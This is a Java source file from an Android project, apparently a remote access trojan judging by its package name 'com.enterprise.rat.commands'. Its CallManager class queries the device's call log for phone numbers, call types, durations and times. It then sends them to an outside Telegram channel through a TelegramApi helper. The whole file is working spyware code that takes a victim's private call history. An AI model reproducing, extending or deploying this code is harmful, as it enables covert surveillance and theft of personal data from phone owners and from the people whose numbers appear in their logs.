package com.enterprise.rat.commands;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import com.enterprise.rat.utils.TelegramApi;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallManager {
    private Context context;

    public CallManager(Context context) { this.context = context; }

    public void sendCallLogs(int limit) {
        StringBuilder sb = new StringBuilder("<b>📞 Last " + limit + " Calls:</b>\n\n");
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");

        if (cursor != null && cursor.moveToFirst()) {
            int count = 0;
            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = cursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

            do {
                String phNumber = cursor.getString(number);
                String callType = getCallType(cursor.getInt(type));
                String callDate = new SimpleDateFormat("dd/MM HH:mm", Locale.getDefault()).format(new Date(cursor.getLong(date)));
                sb.append("<b>").append(callType).append(":</b> <code>").append(phNumber)
                  .append("</code> (").append(cursor.getString(duration)).append("s) at ").append(callDate).append("\n");
                count++;
            } while (cursor.moveToNext() && count < limit);
            cursor.close();
            TelegramApi.sendMessage(sb.toString());
        } else {
            TelegramApi.sendMessage("❌ No call logs.");
        }
    }

    private String getCallType(int t) {
        switch (t) {
            case CallLog.Calls.INCOMING_TYPE: return "IN";
            case CallLog.Calls.OUTGOING_TYPE: return "OUT";
            case CallLog.Calls.MISSED_TYPE: return "MISSED";
            default: return "CALL";
        }
    }
}
